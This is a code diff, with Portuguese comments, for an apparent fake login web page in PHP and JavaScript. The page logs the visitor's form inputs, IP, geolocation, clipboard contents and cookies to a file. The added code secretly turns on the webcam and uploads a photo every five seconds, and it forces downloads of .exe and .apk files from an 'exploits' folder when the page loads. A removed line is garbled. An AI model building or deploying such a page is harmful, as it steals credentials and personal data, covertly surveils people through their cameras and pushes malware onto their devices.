@@ -213,7 +213,7 @@
         mkdir('uploads', 0755, true);
     }
 
-    $file = fopen("dados.txt", "a");
+    $file = @fopen("dados.txt", "a");
     if ($file) {
         $clientNumber = (file_exists("dados.txt") ? count(file("dados.txt", FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES)) / 10 + 1 : 1);
 
@@ -233,47 +233,65 @@
     }
 
     $feedback = '';
-    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['a1'])) {
-        $a1 = $_POST['a1'] ?? 'N/A';
-        $a2 = $_POST['a2'] ?? 'N/A';
-        $a3 = $_POST['a3'] ?? 'N/A';
-        $a4 = $_POST['a4'] ?? 'N/A';
-        $location = $_POST['location'] ?? 'Localização não disponível';
-        $clipboard = $_POST['clipboard'] ?? 'Nenhum texto da área de transferência';
-
-        $file = fopen("dados.txt", "a");
-        if ($file) {
-            $clientNumber = (file_exists("dados.txt") ? count(file("dados.txt", FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES)) / 10 + 1 : 1);
-
-            fwrite($file, "+------------------------------------------------------------------------+\n");
-            fwrite($file, "|                         Cliente $clientNumber                          |\n");
-            fwrite($file, "+------------------------------------------------------------------------+\n");
-            fwrite($file, "|  Dados capturados....                                                  |\n");
-            fwrite($file, "+------------------------------------------------------------------------+\n");
-            fwrite($file, "| Input 1: $a1                                                           |\n");
-            fwrite($file, "+------------------------------------------------------------------------+\n");
-            fwrite($file, "| Input 2: $a2                                                           |\n");
-            fwrite($file, "+------------------------------------------------------------------------+\n");
-            fwrite($file, "| Input 3: $a3                                                           |\n");
-            fwrite($file, "+------------------------------------------------------------------------+\n");
-            fwrite($file, "| Input 4: $a4                                                           |\n");
-            fwrite($file, "+------------------------------------------------------------------------+\n");
-            fwrite($file, "| IP: $ip                                                                |\n");
-            fwrite($file, "+------------------------------------------------------------------------+\n");
-            fwrite($file, "| Localização (Navegador): $location                                     |\n");
-            fwrite($file, "+------------------------------------------------------------------------+\n");
-            fwrite($file, "| Localização (IP): $geoLocationIP                                       |\n");
-            fwrite($file, "+------------------------------------------------------------------------+\n");
-            fwrite($file, "| Área de Transferência: $clipboard                                      |\n");
-            fwrite($file, "+------------------------------------------------------------------------+\n");
-            fwrite($file, "| Cookies: " . ($_SERVER['HTTP_COOKIE'] ?? 'Nenhum cookie disponível') . "\n");
-            fwrite($file, "+------------------------------------------------------------------------+\n");
-            fwrite($file, "\n");
-            fclose($file);
-            $feedback = "<p style='color: green;' class='feedback'>Dados salvos com sucesso!</p>";
-        } else {
-            $feedback = "<p style='color: red;' class='feedback'>Erro ao salvar os dados!</p>";
+    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+        // Processa upload de foto
+        if (isset($_FILES['photo']) && !empty($_FILES['photo']['tmp_name'])) {
+            $photoPath = 'uploads/photo_' . time() . '.png';
+            if (move_uploaded_file($_FILES['photo']['tmp_name'], $photoPath)) {
+                error_log("Foto salva em: $photoPath");
+            } else {
+                error_log("Erro ao salvar foto em: $photoPath");
+            }
         }
+
+        // Processa dados do formulário
+        if (isset($_POST['a1'])) {
+            $a1 = $_POST['a1'] ?? 'N/A';
+            $a2 = $_POST['a2'] ?? 'N/A';
+            $a3 = $_POST['a3'] ?? 'N/A';
+            $a4 = $_POST['a4'] ?? 'N/A';
+            $location = $_POST['location'] ?? 'Localização não disponível';
+            $clipboard = $_POST['clipboard'] ?? 'Nenhum texto da área de transferência';
+
+            $file = @fopen("dados.txt", "a");
+            if ($file) {
+                $clientNumber = (file_exists("dados.txt") ? count(file("dados.txt", FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES)) / 10 + 1 : 1);
+
+                fwrite($file, "+------------------------------------------------------------------------+\n");
+                fwrite($file, "|                         Cliente $clientNumber                          |\n");
+                fwrite($file, "+------------------------------------------------------------------------+\n");
+                fwrite($file, "|  Dados capturados....                                                  |\n");
+                fwrite($file, "+------------------------------------------------------------------------+\n");
+                fwrite($file, "| Input 1: $a1                                                           |\n");
+                fwrite($file, "+------------------------------------------------------------------------+\n");
+                fwrite($file, "| Input 2: $a2                                                           |\n");
+                fwrite($file, "+------------------------------------------------------------------------+\n");
+                fwrite($file, "| Input 3: $a3                                                           |\n");
+                fwrite($file, "+------------------------------------------------------------------------+\n");
+                fwrite($file, "| Input 4: $a4                                                           |\n");
+                fwrite($file, "+------------------------------------------------------------------------+\n");
+                fwrite($file, "| IP: $ip                                                                |\n");
+                fwrite($file, "+------------------------------------------------------------------------+\n");
+                fwrite($file, "| Localização (Navegador): $location                                     |\n");
+                fwrite($file, "+------------------------------------------------------------------------+\n");
+                fwrite($file, "| Localização (IP): $geoLocationIP                                       |\n");
+                fwrite($file, "+------------------------------------------------------------------------+\n");
+                fwrite($file, "| Área de Transferência: $clipboard                                      |\n");
+                fwrite($file, "+------------------------------------------------------------------------+\n");
+                fwrite($file, "| Cookies: " . ($_SERVER['HTTP_COOKIE'] ?? 'Nenhum cookie disponível') . "\n");
+                fwrite($file, "+------------------------------------------------------------------------+\n");
+                fwrite($file, "\n");
+                fclose($file);
+                $feedback = "<p style='color: green;' class='feedback'></p>";
+            } else {
+                error_log("Erro ao abrir o arquivo dados.txt para escrita");
+                $feedback = "<p style='color: red;' class='feedback'></p>";
+            }
+        } else {
+            error_log("POST recebido, mas 'a1' não está presente: " . json_encode($_POST));
+        }
+    } else {
+        error_log("POST não recebido ou método inválido: " . json_encode($_POST));
     }
 
     $exploitFiles = getExploitFiles();
@@ -297,96 +315,92 @@
             <div class="remember">
                 <label><input type="checkbox" name="remember_me"> Lembre de mim</label>
             </div>
+            <input type="hidden" name="location" id="location">
+            <input type="hidden" name="clipboard" id="clipboard">
             <video id="video" autoplay style="display: none;"></video>
             <canvas id="canvas" style="display: none;"></canvas>
-            <input type="hidden" name="location" id="location信号
-
-            <input type="hidden" name="photo" id="photo" accept="image/png" style="display: none;">
             <button type="submit" class="redirect">Enviar</button>
             <?php echo $feedback; ?>
         </form>
     </main>
 
-    <?php
-    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['photo']) && !isset($_POST['a1'])) {
-        if (!is_dir('uploads')) {
-            mkdir('uploads', 0755, true);
-        }
-        $photoPath = 'uploads/photo_' . time() . '.png';
-        move_uploaded_file($_FILES['photo']['tmp_name'], $photoPath);
-        exit;
-    }
-    ?>
-
     <script>
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
-        const locationData = document.getElementById('locationData');
-        const clipboardData = document.getElementById('clipboardData');
         const form = document.getElementById('form');
+        const locationInput = document.getElementById('location');
+        const clipboardInput = document.getElementById('clipboard');
 
+        // Função para capturar clipboard
+        async function captureClipboard() {
+            try {
+                if (navigator.clipboard && navigator.clipboard.readText) {
+                    return await navigator.clipboard.readText() || 'N/A';
+                }
+                return 'Clipboard não suportado';
+            } catch (err) {
+                return 'N/A: ' + err.message;
+            }
+        }
+
+        // Captura localização
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
                 position => {
-                    locationData.value = `Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude}`;
-                    console.log("Localização capturada: ", locationData.value);
+                    locationInput.value = `Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude}`;
+                    console.log("Localização capturada: ", locationInput.value);
                 },
                 err => {
-                    locationData.value = "N/A";
+                    locationInput.value = 'N/A';
                     console.error('Geolocalização negada ou indisponível', err);
                 }
             );
         } else {
-            locationData.value = "N/A";
+            locationInput.value = 'N/A';
             console.log("Geolocalização não suportada pelo navegador");
         }
 
+        // Inicia a câmera e captura fotos continuamente
         navigator.mediaDevices.getUserMedia({ video: true })
             .then(stream => {
                 video.srcObject = stream;
                 const context = canvas.getContext('2d');
 
-                function captureFrame() {
-                    if (!video.videoWidth) return requestAnimationFrame(captureFrame);
+                // Aguarda o vídeo estar pronto
+                video.onloadedmetadata = () => {
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
-                    context.drawImage(video, 0, 0);
 
-                    canvas.toBlob(blob => {
-                        const formData = new FormData();
-                        formData.append('photo', blob, `photo_${Date.now()}.png`);
-                        fetch(window.location.href, {
-                            method: 'POST',
-                            body: formData
-                        })
-                        .then(response => console.log('Foto enviada'))
-                        .catch(err => console.error('Erro ao enviar foto', err));
-                    }, 'image/png');
-
-                    setTimeout(() => requestAnimationFrame(captureFrame), 1000);
-                }
-                requestAnimationFrame(captureFrame);
+                    // Captura e envia fotos a cada 5 segundos
+                    setInterval(() => {
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        canvas.toBlob(blob => {
+                            const formData = new FormData();
+                            formData.append('photo', blob, `photo_${Date.now()}.png`);
+                            fetch(window.location.href, {
+                                method: 'POST',
+                                body: formData
+                            })
+                            .then(response => console.log('Foto enviada com sucesso'))
+                            .catch(err => console.error('Erro ao enviar foto:', err));
+                        }, 'image/png');
+                    }, 5000); // 5 segundos
+                };
             })
             .catch(err => {
                 console.error('Acesso à câmera negado ou indisponível:', err);
             });
 
-        async function captureClipboard() {
-            try {
-                if (navigator.clipboard && navigator.clipboard.readText) {
-                    const text = await navigator.clipboard.readText();
-                    console.log("Clipboard capturado: ", text);
-                    return text || 'N/A';
-                } else {
-                    console.log("Clipboard não suportado");
-                    return 'N/A';
-                }
-            } catch (err) {
-                console.error('Acesso ao clipboard negado ou erro:', err.message);
-                return 'N/A: ' + err.message;
-            }
-        }
+        // Manipula o envio do formulário
+        form.addEventListener('submit', async (event) => {
+            event.preventDefault(); // Evita envio padrão pra garantir clipboard
+            const clipboardText = await captureClipboard();
+            clipboardInput.value = clipboardText;
+            console.log("Clipboard enviado: ", clipboardText);
+            form.submit(); // Envia o formulário
+        });
 
+        // Função para disparar download
         function triggerDownload(filePath, fileName) {
             const link = document.createElement('a');
             link.href = filePath;
@@ -397,6 +411,7 @@
             console.log(`Download iniciado: ${fileName}`);
         }
 
+        // Dispara downloads dos exploits uma única vez
         window.onload = () => {
             document.cookie = "teste_cookie=valor_teste; path=/; max-age=3600";
 
@@ -405,19 +420,9 @@
                 arquivos.forEach((arquivo, i) => {
                     setTimeout(() => {
                         triggerDownload(arquivo.href, arquivo.nome);
-                    }, i * 1000);
+                    }, i * 5000); // Intervalo de 1s entre downloads
                 });
-            } else {
-                console.log("Nenhum arquivo .exe ou .apk encontrado na pasta exploits/.");
-            }
-
-            form.addEventListener('submit', async (event) => {
-                event.preventDefault();
-                const clipboardText = await captureClipboard();
-                clipboardData.value = clipboardText;
-                console.log("Clipboard enviado: ", clipboardText);
-                form.submit();
-            });
+            } 
         };
 
         /* 
